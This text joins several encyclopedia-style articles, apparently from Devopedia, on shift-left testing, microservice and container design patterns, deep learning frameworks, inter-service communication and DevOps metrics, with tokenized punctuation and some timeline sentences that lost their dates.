Are there different types of Shift Left Testing ?
Shift Left has been compared to a production line with raw materials on the left moving towards finished goods on the right .
It 's also been compared to kanban boards with completed tasks moving from left to right .
In all cases , Shift Left is about getting involved at an early stage , which happens " to the left " .
While shift - left testing is really about continuous testing , four types have been identified : traditional shift left , incremental shift left , Agile / DevOps shift left and model - based shift left .
With model - based shift left , testing can begin even before a software implementation is ready .
Tests are against executable requirements , architecture , and design models .
How can I get started with Shift Left ?
With regard to testing , developers can take up some testing tasks ( unit tests for example ) while testers need to learn to code .
This will help them collaborate better and automate tests .
They also need to use the same tools .
By adopting TDD or BDD , a project will start with testability in mind .
At the least , static testing plans , automation scripts and API tests can be written even before development starts .
Test managers must move to new roles as shift - left testing could make them redundant .
Small iterative changes along with collaboration across teams , code reviews , automation and monitoring are all part of applying Shift Left .
Workflows should be defined and followed .
Configurations should be immutable and scripted , avoiding ad hoc changes .
Give tools and dashboards to developers for insights into production .
Developers should be able to see failures at all stages .
It 's important to be proactive rather than reactive .
Deployment procedures should be standardized so that the development and production environments are as close as possible .
Use patterns to get consistent environments .
Development and operations should work closely rather than in silos .
What are some myths about Shift Left ?
One of the myths is that testing is done by developers and hence QA teams will become redundant .
In reality , QA teams will work more closely with development teams .
Developers will be aware of testing needs .
Testers will get insights into what 's being developed .
A related myth is that Shift Left is not aligned to Agile practices .
This myth is also busted since greater collaboration between QA and development teams means that they can iterate faster .
Another myth is that the return on investment is not proven .
In fact , studies have shown that fixing problems at a later stage is very costly .
Another myth is that there are no tools to aid in shifting left .
In reality , Shift Left is about processes , people and tools .
Automation tools play an important role .
The same tools that can be used by multiple teams , including testing tools within a development environment , ease the implementation of Shift Left .
Behaviour - Driven Development ( BDD ) , Continuous Integration and Continuous Deployment rely on automation and help accelerate Shift Left .
I 've heard of Shift Right .
Does it replace Shift Left ?
No .
Shift Right complements Shift Left .
As of 2018 , Shift Right is commonly used for testing .
Shift - left testing is about improving quality , testing often , shortening test cycles and automation .
It 's about checking for expected software behaviour .
What about undefined , unknown or unexpected behaviours ?
What about performance , user experience or fault tolerance ?
Production environments with live traffic and real users are different from typical test environments .
This is where shift - right testing comes in .
With shift - right testing , testing is done in production where you may find unexpected behaviour .
It involves deploying small changes to production , monitoring closely and reacting quickly if failures happen .
Software deployed for shift - right testing is not done and dusted .
It has to be monitored and rolled back if needed .
With shift - right testing , you can gather user feedback and improve test coverage .
Among the approaches to shift - right testing are duplicating live traffic for test purpose , A / B testing and canary deployments .
Chaos engineering , implemented with tools such as Chaos Monkey , can be considered as a form of shift - right testing .
In the 1950s , software was often developed and tested by the same people .
It 's therefore common practice to test continuously .
There are no separate testing or QA teams , which come later .
The Waterfall model as illustrated and critized by Royce .
Source : Royce 1970 , fig .
2 .
Winston Royce describes the different steps in building large software systems .
In his description , testing happens towards the end of the development cycle .
Royce himself clams that this is " risky and invites failure " .
Unfortunately , software teams adopted this approach while ignoring Royce 's recommendations towards an iterative approach .
This top - down unidirectional flow is later named the Waterfall Model .
The 1990s is the decade when teams realized that the Waterfall model was not working out .
The principle of Shift Left began in this decade .
The use of the term Shift - Left Testing appears in an article published by Dr .
Dobb 's .
The author , Larry Smith , writes , Shift - left testing is I refer to a better way of integrating the quality assurance ( QA ) and development parts of a software project .
Some common microservice design patterns .
Source : Ibryam 2018 .
For common software design problems , design patterns provide reusable solutions .
Rather than design a solution from scratch , it 's faster and easier to understand the context and see what design patterns can be reused for your application .
For a cloud application that uses containers and microservices , there are patterns to do the same .
Called either Design Patterns for Microservices or Container Design Patterns , we use these terms interchangeably in this article .
Let 's note that this article is not about container data structures or components .
In programming , containers are data structures such as sets and queues that contain other data members .
Such containers have design patterns too .
What 's the motivation for adopting design patterns for microservices ?
Sometimes there 's a need to scale your monolithic application , to release updates faster or to manage large teams of diverse skills .
One approach is to re - architect your application into a bunch of microservices that get deployed on the cloud as containers .
This refactoring can be a long process for a complex product .
It can also be daunting for folks new to microservice architecture .
This is where design patterns can help .
These patterns have evolved from best practices that engineers used when managing microservices and containers .
When solutions to problems are known , they can be applied to similar problems in the future .
Patterns formalize this concept of reusable solutions .
Patterns help you to build your apps faster and make them more reliable .
Moreover , you may be able to use libraries or tools – Amalgam8 , Hystrix , Eureka , Zuul – that have already implemented some of these patterns .
What are the elements of a good container design pattern ?
A design pattern must be clearly described with concrete examples and best practices .
Without a clear understanding , others will not be able to apply or even know if it suits their application needs .
The pattern must be agnostic of container runtimes or cloud infrastructure .
For any pattern to be practical , it 's necessary that the containers themselves are properly designed .
Container design principles can be applied in two different contexts : Build time : single concern , self - containment , image immutability Runtime : high observability , lifecycle conformance , process disposability , runtime confinement . From the perspective of delivering software - as - a - service , similar principles have been noted in Heroku 's The Twelve - Factor App .
What are the common design patterns for microservices ?
Overview of various design patterns for microservices .
Source : Richardson 2017b .
There are dozens of design patterns for microservices that can be grouped into categories such as decomposition , observability , testing , UI , communication , database , security , deployment , and so on .
Google engineers identified the following in their work with Kubernetes : Single container management : graceful termination , probing , config maps Single node multi container : sidecar , ambassador , adapter Multi node : leader election , work queue , scatter / gather Microsoft has published a number of design patterns including ambassador , backends for frontends , CQRS , event sourcing , gatekeeper , gateway aggregation , sidecar , strangler , throttling , etc .
Other patterns to note are model , denormalizer , ingestor , service registry , edge controller , API gateway , circuit breaker , fallback , command , bounded context and failure as a use case .
Since there are so many patterns , which ones are important or essential to know ?
It 's hard to claim that one pattern is more important than another .
It all depends on the context and the needs of a particular application .
However , we can highlight the following patterns : API Gateway : Clients call your application via command - line tools or GUI .
Rather than calling each service of your app separately , all calls will go via the gateway .
Service Registry : Since microservices are created and destroyed dynamically based on load , this pattern helps in connecting clients to available instances of microservices .
Microservices register with the service registry .
Circuit Breaker : When a service is down , this failure could cascade to other services dependent on it .
To prevent escalation , if failures exceed a certain threshold , services will not repeatedly call a failed service until recovery happens .
Fallback : Also called Chain of Responsibility pattern , if a service is unable to complete because of a dependency , a fallback method is called .
By combining the fallback pattern with the circuit breaker pattern , more resilient apps can be built .
Could you explain patterns for running two containers on a single node ?
There are three common patterns : sidecar , adapter , ambassador .
Source : Palmer 2018 .
Let 's look at three patterns that each involve two closely associated containers .
It makes sense to pair containers within the same node ( or same Kubernetes pod ) if they have the same lifecycle .
One of them is the main container while the other can be seen as a helper .
We explain them as follows : Sidecar : To provide an auxiliary service to the main container , such as for logging , synchronizing services , or monitoring .
Adapter : To standardize or normalize the output / input / interface between the main container and the external world , such as reformatting logs or invoking libraries that do n't have expected language bindings .
Ambassador : To connect the main container to the outside world , such as for proxying localhost connections to outside connections .
For example , the main container will always see a localhost database with the ambassador resolving this to the actual database outside .
Are there patterns to managing data in a microservice architecture ?
Benefits and challenges of microservice data management .
Source : Devopedia .
For the easiest migration from a monolithic app , all services can share the same database .
For better isolation and modularity , we can adopt private - tables - per - service and schema - per - service , perhaps on the same database server .
For high throughput requirements , each service could have its own database server .
One challenge with microservices is to ensure data consistency across all services .
An important principle is to have a single authoritative source of truth : all others are read - only and non - authoritative .
Services can synchronously query for data or asynchronously update it via events when that data changes .
Whether to use synchronous API or asynchronous messaging depends on your application , since both have their trade - offs .
An event - driven architecture using a publish - subscribe model aids asynchronous updates .
Store only what a service needs .
If services are constantly exchanging data , you might want to rethink service boundaries .
A transaction that involves multiple services is not easy to implement .
Some patterns are available : Saga Pattern , API Composition , Command Query Responsibility Segregation ( CQRS ) , Scheduler Agent Supervisor , and Compensating Transaction .
To allow trace propagation through multiple microservices , the Correlation ID pattern is identified by Gregor Hohpe in his book Enterprise Integration Patterns .
It 's important to note that the pattern is identified in a different context and only later applied to microservices .
Influenced by fig trees , Martin Fowler documents the Strangler pattern .
This is useful when migrating from a monolithic app to a microservice architecture .
Rather than having a cut - over date to move from old to new , this pattern enables a gradual transition .
In his book Release It !
, Michael Nygard introduces the Circuit Breaker pattern .
With this pattern , a service " fails fast " by not calling another service that it knows is already down .
Netflix 's Hystrix framework implements this pattern .
The term microservices was first used at a workshop in Venice .
By 2012 , ideas and case studies will be presented .
Adrian Cockcroft of Netflix sees this as " fine - grained SOA " .
Although the history of containers can be traced to UNIX of the late 1970s , Docker as a container will be released in 2013 .
Developers have begun to see containers as a natural fit for microservices .
Brendan Burns and David Oppenheimer present a bunch of patterns for container - based apps at the HotCloud 2016 conference .
This paper may be considered foundational and credited with putting the spotlight on container patterns .
A selection of Deep Learning frameworks , some with corporate backing .
Source : den Bakker 2017 .
Deep Learning ( DL ) is a neural network approach to Machine Learning ( ML ) .
While it 's possible to build DL solutions from scratch , DL frameworks are a convenient way to build them quickly .
Such frameworks provide different neural network architectures out of the box in popular languages so that developers can use them across multiple platforms .
Choosing a framework for your problem depends on a number of factors .
Therefore , it 's not possible to name just one framework that should be preferred over another .
Many frameworks are open source .
Cloud providers also provide easy ways to deploy and execute a framework on their infrastructure .
Sometimes the term " framework " is used interchangeably with the terms " toolkit " or " library " .
Could you mention some popular DL frameworks ?
A chart from 2018 showing some popular DL frameworks .
Source : Hale 2018 .
Among the popular open source DL frameworks are TensorFlow , Caffe , Keras , PyTorch , Caffe2 , CNTK , MXNet , Deeplearning4j ( DL4J ) , and many more .
Many of these frameworks support Python as the programming language of choice .
DL4J is for Java programmers but models written in Keras can be imported into DL4J. Among those supporting C++ include Caffe , DL4J , CNTK , MXNet and TensorFlow .
Torch was written in Lua and C , and PyTorch extends and improves on it with Python support .
Paddle is a framework from Baidu .
These frameworks are not all at the same level of abstraction .
For example , Keras provides a simpler API for developers and sits on top of TensorFlow , Theano or CNTK .
Likewise , Gluon is an API that can work with MXNet and CNTK .
Gluon can be seen as competition for Keras .
Among those not open source are Intel Math Kernel Library , MATLAB Neural Network Toolbox , Neural Designer , and Wolfram Mathematica NeuralNetworks .
A curated list of ML frameworks is available online .
How should I go about selecting a suitable DL framework ?
A 2017 comparison of some DL frameworks .
Source : Rubashkin 2017 .
Some obvious factors to consider are licensing , documentation , active community , adoption , programming language , modularity , ease of use , and performance .
Keras and PyTorch are said to be easy to use , but you can also consider TensorFlow of its popularity .
More specifically , you should check the following : Style : Imperative or symbolic .
Core Development Environment : Programming language , intuitive API , fast compile times , tools , debugger support , abstracting the computational graph , graph visualization ( TensorBoard ) , etc .
Neural Network Architecture : Support for Deep Autoencoders , Restricted Boltzmann Machines ( RBMs ) , Convolutional Neural Networks ( CNNs ) , Recurrent Neural Networks ( RNNs ) , Long Short - Term Memory ( LSTMs ) , Generative Adversarial Networks ( GANs ) , etc .
Optimization Algorithms : Gradient Descent ( GD ) , Momentum - based GD , AdaGrad , RMSProp and Adam , etc .
Targeted Application Areas : Image recognition , video detection , voice / audio recognition , text analytics , Natural Language Processing ( NLP ) , timeseries forecasting , etc .
Hardware Extensibility : Support for multiple CPUs , GPUs , GPGPUs or TPUs across multiple machines or clusters .
Optimized for Hardware : Execute an optimized low - level code by supporting CUDA , BLAS , etc .
Deployment : Framework should be easy to deploy in production ( TensorFlow Serving ) .
Which DL frameworks are symbolic and which ones are imperative ?
Let 's briefly understand the difference between the two .
Imperative programs perform computations as they are encountered along the program flow .
Symbolic programs define symbols and how they should be combined .
They result in what we call a computational graph .
Symbols themselves might not have initial values .
Symbols acquire values after the graph is compiled and invoked with particular values .
Torch , Chainer and Minerva are examples of imperative - style DL frameworks .
Symbolic - style DL frameworks include TensorFlow , Theano and CGT .
Also in symbolic style are CXXNet and Caffe that define the graph in configuration files .
Imperative frameworks are more flexible since you 're closer to the language .
In symbolic frameworks , there 's less flexibility since you write in a domain - specific language .
However , symbolic frameworks tend to be more efficient , both in terms of memory and speed .
At times , it might make sense to use a mix of both framework styles .
For example , parameter updates are done imperatively and gradient calculations are done symbolically .
MXNet allows a mix of both styles .
Gluon uses an imperative style for easier model development while also supporting dynamic graphs .
From a mathematical perspective , what are the main features expected of a DL framework ?
All data is represented as tensors ( multi - dimensional arrays ) .
A DL framework must therefore support tensors and operations on them .
The ability to define dynamic computational graphs is desired by developers .
Being dynamic means that graph nodes can be added or removed at runtime .
With PyTorch and Chainer , graphs can be defined dynamically .
With TensorFlow , you have to define the entire computation graph before you can run it .
TensorFlow more recently has TensorFlow Fold for dynamic graphs and eager execution for immediate execution .
An essential operation in a DL network during learning is function differentiation .
Automatic Differentiation is a feature that must be supported by a DL framework .
This is straightforward when the framework uses a computational graph .
In terms of hardware support for DL frameworks , what should I look for ?
Mobile libraries for DL inference .
Source : Koul 2017 , slide 25 .
Deep Learning involves training and inference .
Training is often done in cloud clusters .
Inference can at times happen on constrained IoT devices , embedded systems or smartphones .
Thus , trained models should be able to run on ARM - based hardware .
For example , Caffe2 is suitable for smartphones while TensorFlow is for research and server - side deployment .
However , there 's TensorFlow Lite for inference on constrained devices .
When running on NVIDIA GPUs , you should check if there 's support for CUDA that enables the most efficient use of GPUs .
An alternative to CUDA is OpenCL but most DL frameworks do n't support it .
OpenMP is more widely supported and it enables multiplatform - shared memory multiprocessing .
In addition , hardware vendors provide a number of libraries and optimizers so that DL frameworks make the best use of their hardware .
Among these are NVIDIA 's cuDNN , cuBLAS , cuSPARSE , TensorRT , DeepStream , and many more .
Intel offers the Math Kernel Library for Deep Neural Networks ( MKL - DNN ) , Data Analytics Acceleration Library ( DAAL ) , OpenVINO , nGraph , and others .
How do the popular DL frameworks compare in terms of performance ?
Since DL frameworks are always improving , what 's mentioned here should be only a starting point for your study .
One study from early 2018 compared some DL frameworks on three datasets .
Nvidia GPUs were used along with cuDNN , an Nvidia library tuned for common DL computations .
Among the faster frameworks are TensorFlow , PyTorch , MXNet , CNTK and Julia - Knet .
It was seen that CNTK and TensorFlow are much faster than Keras - CNTK and Keras - TF respectively .
While Keras simplifies development , the tradeoff is performance .
In other studies , TensorFlow is said to be slower than CNTK and MXNet .
MXNet stands out in terms of scalability and performance .
Ultimately , the framework itself may not matter much when cuDNN is used to provide acceleration on NVIDIA 's GPUs .
Any difference in performance will come from how frameworks scale to multiple GPUs and machines .
While the theory of neural networks inspired by the human brain was first formulated in 1943 , Alexey Ivakhnenko and his team created the first working Deep Learning network in 1965 .
In 1971 , they succeeded in building an 8-layer network .
The term Deep Learning ( DL ) is used for the first time to mean a neural network with many layers .
By 2017 , a DL network is as much as 1000 layers deep .
At the Montreal Institute for Learning Algorithms ( MITA ) , Theano is developed in Python for efficient math operations that can run on either CPU or GPU architectures .
It enables developers to run rapid experiments in Deep Learning .
In later years , Theano went on to inspire other frameworks .
Ten years later ( in 2017 ) , it 's announced that Theano will no longer be actively maintained .
Invented by Berkeley Vision and Learning Center at UC Berkeley , the Caffe framework has been released .
In 2017 , Facebook opened sources to an evolution of Caffe called Caffe2 .
This year may be considered the turning point for DL frameworks .
A number of DL frameworks are released : Chainer , Keras , Apache MXNet and TensorFlow .
Microsoft released open sources Computational Network Toolkit ( CNTK ) , a DL toolkit it 's been using internally for speech and image recognition .
CNTK supports multiple GPUs across multiple machines .
The Python - based open source library Keras 1.0 was released .
It 's a major re - writing of Keras while being backward compatible .
It 's been said that Keras has an " API designed for human beings , not machines " .
Among the frameworks to come out in 2017 is Caffe2 from Facebook .
Deeplearning4j for the Java and Scala communities becomes part of the Eclipse Foundation , although its origins can be traced to 2014 .
PyTorch is open source by Facebook and it started to become popular when DL course fast.ai adopted it .
With so many DL frameworks , the landscape can look very fragmented for developers .
Open Neural Network Exchange ( ONNX ) has been released as an open format that enables developers to export / import models from / to frameworks .
For example , you can build a PyTorch model , export it in ONNX format , and import into MXNet where it can be used for inference .
Mention of DL frameworks in arXiv research papers from 2012 - 2018 .
Source : Neuromation 2018 .
An analysis of arXiv 45,000 ML papers shows the popularity of TensorFlow , having overtaken Caffe in 2017 .
Adoption of Keras and PyTorch also appears to be growing .
Caffe2 and PyTorch , both out of Facebook , plan to come together into a single platform .
The intent is to " combine the flexible user experience of the PyTorch frontend with scaling , deployment and embedding capabilities of the Caffe2 backend " .
Based on PyTorch , v1.0 of fastai has been released as a free open source library for DL .
In a monolithic application , all parts of the app access a shared database .
Each part can easily invoke the functionality of another part .
In a microservice architecture , an app is composed of many microservices , each potentially managing its own database .
What happens if one service requires data or processing from another service ?
This is not as trivial or efficient as in a monolithic application .
Inter - service communication ( ISC ) is an important consideration when designing a microservice - based application .
A badly designed app can result in a lot of communication among the different services , resulting in a chatty app or chatty I / O. Communication can be reduced by having fewer microservices but this replaces the monolith with smaller monoliths .
The goal is , therefore , to achieve a balance by following good design principles and patterns .
Why do microservices need to communicate with one another ?
A taxi booking app is made up of many communication microservices .
Source : Richardson 2015 .
In the traditional approach to building monolithic applications , a lot of communication was internal to the app .
Such communication was often local , fast and easily manageable .
When designing a microservice architecture , we break up the monolithic into independent parts , each of which has a well - defined role .
While each microservice can be deployed and scaled independently , none of them deliver the full value of the application .
A microservice will often require data managed by another , or require the services of another .
For example , consider a taxi booking application .
Trip management and passenger management are separate microservices but a trip can not be initiated without some knowledge or authentication of the passenger .
Hence , these two independent microservices , each doing its specific roles , will still need to communicate .
While microservice architecture has brought benefits to building large - scale applications , it has also exposed communication across microservices .
Complexity that was previously hidden is now visible .
Dozens or even hundreds of microservices that make up an app must be " wired together " properly to make the whole thing work .
What are the different types of inter - service communication for microservices ?
Illustrating the call flows of sync and async communication .
Source : Walking Tree Technologies 2018 .
Broadly , there are two types : Synchronous : The Client sends a request and waits for a response .
Client code execution itself may prefer to receive the response via a callback ( thread is not blocked ) or wait ( thread is blocked ) .
Either way , communication with the external world is synchronous .
Asynchronous : The Client sends a request and does n't wait for a response .
With synchronous communication protocols , the receiver has to be available to send back the response .
From an application perspective , synchronous implies a less responsive user experience since we have to wait for the response .
If one of the services in a chain of synchronous requests delays its response , the entire call flow gets delayed .
With asynchronous communication protocols , the request ( often called message ) is typically sent to a message queue .
Even if the receiver is not available , the message will remain in the queue and can be processed at a later time .
Even if a service fails to respond , the original asynchronous call is not affected since it 's not waiting for a response .
What protocols and data formats are suitable for inter - service communication for microservices ?
Different interaction styles among microservices .
Source : Richardson 2015 .
HTTP / HTTPS is a synchronous protocol .
Often , service APIs are exposed as REST endpoints .
AMQP and MQTT are examples of asynchronous protocols .
To manage the queue , we can use RabbitMQ message broker .
Instead of a message queue , we can also use an event bus for updating data asynchronously .
Synchronous protocols are usually limited to one - to - one interactions .
Asynchronous protocols have more options : one - to - one ( notifications ) , one - to - many ( publish / subscribe ) , or even allow for responses to come back asynchronously .
For example , a user sends a tweet on her Twitter account that has many followers .
This is an example of the one - to - many publish / subscribe model .
The data that these protocols carry must be formatted in a manner understood by all .
Text - based formats include JSON and XML .
XML , in particular , is very verbose .
Therefore , some implementations may prefer binary formats : MessagePack , Thrift , ProtoBuf , Avro .
Note that these are well - known and popular formats and using them enables easier integration of microservices .
It 's also possible ( but not preferred ) to use a proprietary non - standard format internal to an application .
What design patterns are available for inter - service communication for microservices ?
Here are a few patterns to note : Saga Pattern : A sequence of transactions , each one local to its database .
A microservice triggers another via an event or message .
If something fails , reverse operations undo the changes .
API Composition : Since table joins are not possible across databases , a dedicated service ( or API gateway ) coordinates the " joins " , which are now at the application layer rather than within the database .
Command Query Responsibility Segregation ( CQRS ) : Services keep materialized views based on data from multiple services .
These views are updated via subscribed events .
CQRS separates writing ( commands ) from the reading ( queries ) .
Event Sourcing : Rather than store state , we store events .
State may be computed from these events as desired .
This is often used with CQRS : write events but derive states by replaying the events .
Orchestration : A central controller or orchestrator coordinates interactions across microservices .
An API composition is a form of orchestration .
Choreography : Each microservice knows what to do when an event occurs , which is posted on an event stream / bus .
Service Mesh : Push application networking functions down to the infrastructure and not mix them with business logic .
Could you compare orchestration and choreography ?
Comparing orchestration and choreography for microservices .
Source : Adapted from Bonham 2017 .
Orchestration is a centralized approach .
Calls are often synchronous : the orchestrator calls service A , waits for a response , then calls service B , and so on .
This is good if service B depends on data from service A. However , if service A is down , service B ca n't be called .
By coupling B with A , we 've created a dependency .
The orchestrator also becomes a single point of failure .
Choreography enables peer - to - peer interactions without a centralized controller .
It 's more flexible and scalable than the orchestration approach .
It 's event - driven architecture applied to microservices .
The logic of handling an event is built into the microservice .
The choreography is asynchronous and non - blocking .
The patterns CQRS and Event Sourcing are applicable to choreography .
There are also hybrid approaches where a service orchestrates a few services while it interacts with others via an event stream .
In another approach , an orchestrator emits events for other services and consumes response events asynchronously from the event stream for further processing .
To conclude , orchestration is about control whereas choreography is about interactions .
How do we handle service API calls that fail ?
Circuit breakers can isolate failures and help in recovery .
Source : Gopal 2015 .
The simplest solution is to retry after a specified timeout .
A maximum number of retries can be attempted .
However , if the operation is not idempotent ( that is , it changes application state ) , then retry is not a safe recovery method .
The other approach is to use a circuit breaker .
Many failed requests can result in a bottleneck .
There 's no point sending further requests .
This is where we " open the circuit " to prevent further requests to a service that 's not responding .
We can also proactively reduce chances of failure by load balancing requests .
A request must be processed by a service instance and we can select an instance that has less load .
Container orchestrators ( Kubernetes ) or service meshes ( Istio ) enable this .
Are there any best practices for defining a service API ?
Microservices must be designed to be independent of one another .
One approach is to use Domain - Driven Design .
This talks about understanding the problem space , using design patterns , and refactoring continuously .
The API should model the domain .
It should n't leak internal implementations .
APIs must have well - defined semantics and versioning schemes .
A microservice can support multiple versions of an API or you could have a service for each version .
Public APIs are usually REST over HTTP .
Internal APIs can adopt RPC - style , where remote calls can look like local calls .
However , they should be designed right to avoid chattiness .
Consider the trade - off between making many I / O calls and retrieving too much data .
Since application state is now distributed across microservices , design for and manage Eventual Consistency .
While REST calls may use JSON , RPC calls can be more efficient with binary formats enabled by RPC frameworks such as gRPC , Apache Avro and Apache Thrift .
To simplify API design and development , use an Interface Definition Language ( IDL ) .
This will generate client code , serialization code and API documentation .
What are some anti - patterns to avoid when microservices need to communicate ?
The Canonical data model is an anti - pattern .
Source : Harsanyi 2017 .
Sharing a database across many microservices is an anti - pattern since this introduces tighter coupling .
A single data model for all microservices is another .
Using synchronous protocols across many microservices increases latencies and makes your app brittle to failures .
If microservices are not properly defined , this may result in chatty I / O that affects performance and responsiveness .
An application may depend on hundreds of shared libraries .
In the spirit of code reuse , all microservices may rely on these libraries .
This results in another anti - pattern called distributed monolith .
Reusing code within a domain or service boundary is fine , but anything beyond that is coupling .
This form of coupling is worse than code duplication .
Shared libraries can be considered but not made mandatory in some areas : logging , tracing , routing .
It 's not required that every event should contain full data , particularly when consumers are going to use only some of it .
Consider sending essential data and URLs pointing to additional data .
To communicate , consider REST plus its alternatives such as messaging and event sourcing .
What tools can I use to implement inter - service communication for microservices ?
Among the message brokers are RabbitMQ , Kafka , ActiveMQ , and Kestrel .
Cloud providers offer their own messaging systems such as Amazon SQS , Google Cloud Pub / Sub , and Firebase Cloud Messaging ( FCM ) .
Microsoft Azure offers Event Grid , Event Hubs and Service Bus for messaging .
NATS , a CNCF project , is an open source messaging system .
Istio enables service mesh technology .
Azure Service Fabric Mesh is an alternative .
These rely on Envoy as the networking proxy .
Similar proxies include Linkerd and Cilium .
Conduit is a service mesh designed for Kubernetes .
Netflix 's Conductor can help with orchestration .
For logging and monitoring , we have Retrace , Logstash , Graylog , and Jaeger .
OpenTracing is an API that enables distributed tracing .
The Circuit breaker pattern can be implemented with Netflix 's Hystrix .
To define service APIs , Swagger can be used .
In Java , REST - based microservices can be created with Spring Boot .
Eric Evans publishes Domain - Driven Design : Tackling Complexity in the Heart of Software .
The book relates directly to object - oriented programming .
Only later will the relevance of microservices be understood .
Michael Nygard explains the circuit breaker pattern in his book Release It !
: Design and Deploy Production - Ready Software .
This helps us build fault - tolerant systems .
In 2011 , Netflix invented the Hystrix framework that includes the circuit breaker pattern .
Netflix embraces API - driven architecture that affects both development and operations .
This is today seen as the birth of microservices .
At the start of this decade , the three - tier model ( web tier , app tier , database tier ) was found to break under heavy load .
Microservices come to the rescue , but they also cause problems relating to inter - service communication .
Companies introduce libraries that are built into microservices to handle the networking aspects : Google 's Stubby , Netflix 's Hystrix , Twitter 's Finagle .
This , however , introduces coupling .
A few years later , these evolved into networking proxy and service mesh .
Version 0.0.7 of Linkerd is open source on GitHub .
It 's based on Twitter 's Finagle and Netty .
This is one of the early beginnings of a service mesh .
Likewise , Istio version 0.1.0 was released as an alpha version in May 2017 .
An example DevOps scorecard of important metrics .
Source : Chakravarty 2014 .
DevOps encourages incremental changes and faster releases while also improving quality and satisfaction .
But how do we know if DevOps is making an impact ?
How do we decide what needs to change ?
We need to measure and this is where DevOps metrics come in .
Metrics give insights into what 's happening at all stages of the DevOps pipeline , from design to development to deployment .
Metrics are objective measures .
They strengthen the feedback loops that are essential to DevOps .
Collecting metrics and displaying them via dashboards or scorecards should be automated .
It 's important to map these metrics to business needs .
What factors make for a good DevOps metric ?
A good DevOps metric must ideally be all of these : Obtainable : A metric that ca n't be measured is useless .
Reviewable : It must be relevant to the business and stand up to scrutiny .
Incorruptible : It should be free from the influence of teams and team members .
Actionable : It should suggest improvements to workflows , policies , incentives , tools , etc .
Traceable : It should be possible to trace the metrics to root causes .
What 's the process of working with DevOps metrics ?
Key process steps with DevOps metrics .
Source : Pfeiffer 2017 .
A typical process involved identifying the metrics , putting in place methods to measure them , measuring and displaying them on dashboards , evaluating the metrics in terms of status and trends , acting on the metrics to effect change , and continually assessing if the metrics are aligned to business goals .
Since DevOps is cross - functional ( process , people , tools ) and cross - teams ( dev , ops , testing ) , metrics should not narrowly focus on only some parts of the value chain .
Metrics should capture a holistic view of the entire value chain .
What are some important DevOps metrics ?
Metrics across the DevOps pipeline .
Source : Electric Cloud 2017 .
There are dozens of metrics spread across all phases of a DevOps pipeline .
Some have attempted to group them into categories : Velocity : lead time , change complexity , deployment frequency , MTTR Quality : deployment success rate , application error rate , escaped defects , number of support tickets , automated test pass percentage , Performance : availability , scalability , latency , resource utilization Satisfaction : usability , defect age , subscription renewals , feature usage , business impact , application usage and traffic Another grouping can be host - based metrics , application metrics , network metrics , server pool metrics and external dependency metrics .
There are also metrics for application build cycles , metrics for application performance , metrics for delivery performance , metrics organized by infrastructure , system and team health , and metrics for building or running apps .
At a minimum , we aim for more deployments per week , shorter lead time from code committed to deployment , lower failure rate in production , and shorter time to repair failures .
Have metrics to measure these .
Likewise , a study from 2019 identified lead time , deployment frequency , mean time to restore ( MTTR ) and change fail percentage as key metrics .
What are the important metrics in the world of microservices and serverless architectures ?
For microservices , metrics include the number of requests per second , number of failed requests per second , and distribution of request service times .
For serverless , the concern shifts from monitoring infrastructure to the application itself .
Metrics include performance such as function runtime ; scaling such as concurrency limits or memory limits ; tracing event - triggered call flows across services or functions ; and errors such as code bugs , wrong invocation or function timeout .
For both microservices and serverless , it 's important to instrument the code .
OpenTracing provides a vendor - neutral API for distributed tracing .
Observability is an important aspect , which means that communication across services and functions needs to be accessible .
A single request must be correlated to the sequence of service calls that followed it .
Istio is a tool that requires strong observability .
Could you describe some DevOps metrics adopted from traditional engineering practices ?
Some metrics are borrowed from engineering systems .
Source : Woo 2017 , fig .
3.9 .
From traditional engineering , DevOps has adopted the following metrics : Mean Time To Detect ( MTTD ) : This is the average time to discover a problem .
It 's an indication of how effective your incident management tools and processes are .
Mean Time To Failure ( MTTF ) : This is an indication of how long on average the system or a component can run before failing .
This can suggest preventive maintenance .
This metric relates to improving system uptime .
Mean Time Between Failures ( MTBF ) : This is the average time between failures .
It 's a measure of reliability and availability .
Mean Time To Repair ( MTTR ) : This is the average time to repair / resolve / recover after failure is detected .
This metric relates to reducing system downtime .
Code complexity is one aspect that affects MTTR .
The goal is to reduce MTTD and MTTR while increasing MTTF and MTBF .
DevOps is about incremental changes .
If many changes are introduced at once , it will take longer to detect and fix issues .
Are there DevOps metrics that one should avoid ?
Teams transitioning to DevOps might end up adopting the wrong metrics .
In fact , traditional metrics such as MTBF could be seen as irrelevant for DevOps where some failures are expected due to the speed of delivery .
Look beyond such costs .
Instead , improve the total economic impact .
Others to avoid are metrics that focus on business velocity at the expense of quality or culture ; metrics that are optimized for one team and cause negative impact on others .
Avoid conflict metrics that promote individuals rather than teams or pit one team against another .
These include ranking individuals or teams based on failure metrics ( broken builds , etc .
) , rewarding top performers who do n't collaborate or have different standards for different teams .
Avoid vanity metrics that promote quantity or speed over quality : number of lines of code , number of deployments per week , number of bugs fixed , number of tests added .
Do n't collect a specific metric just because it 's easy .
Do n't use a metric that encourages negative behaviour .
It 's been said , human beings adjust behavior based on the metrics they ’re held against ... What you measure is what you ’ll get .
Could you mention some best practices when using DevOps metrics ?
For those new to DevOps metrics , start with metrics that are simpler to collect and manage .
Get the momentum going .
For better focus , do n't apply too many metrics .
Choose metrics aimed at broader organizational goals or process health issues .
Measure fast to enable real - time feedback loops .
Because automated system - based metric collection is hard to do , you may want to start with surveys .
In fact , both these are complementary .
Surveys are good for metrics on culture or things outside the system .
Use metrics that suit your business model .
Adopt value stream mapping in which each metric is mapped to business values .
For example , measuring website responsiveness becomes more useful if you can map it to business outcomes such as customer churn or abandoned shopping carts .
Metrics can also be role - based ( business vs engineering ) : they give teams the choice to customize their own dashboards .
In fact , dashboards are essential for tracking all metrics in one place .
Compare trends , not teams .
Look for outliers .
Measure lead time to production , not just completion .
Evolve your metrics as new technologies and tools enter your DevOps pipeline .
Are there tools to help teams collect metrics for DevOps ?
Many tools are available for various DevOps tasks .
Some of these show metrics and even do real - time monitoring .
We briefly mention some of them .
In any case , there 's a need to provide teams with a single unified dashboard regardless of the tool that collects the metrics .
Nagios is widely used for IT infrastructure monitoring .
Zabbix , Sensu and Prometheus are alternatives .
Prometheus is for service monitoring .
It 's often used with the visualization and analytics of Grafana .
For application performance monitoring , there are New Relic , AppDynamics , Compuware and Boundary .
For deeper integration , cross - platform data aggregation and monitoring , there 's BigPanda and PagerDuty .
JIRA Software does issue and project tracking .
Code Climate automates code review and analysis .
OverOps detects bugs proactively .
For building automation , there 's Apache Ant .
Jenkins is useful for continuous integration and delivery .
A chef and puppet help with continuous deployment .
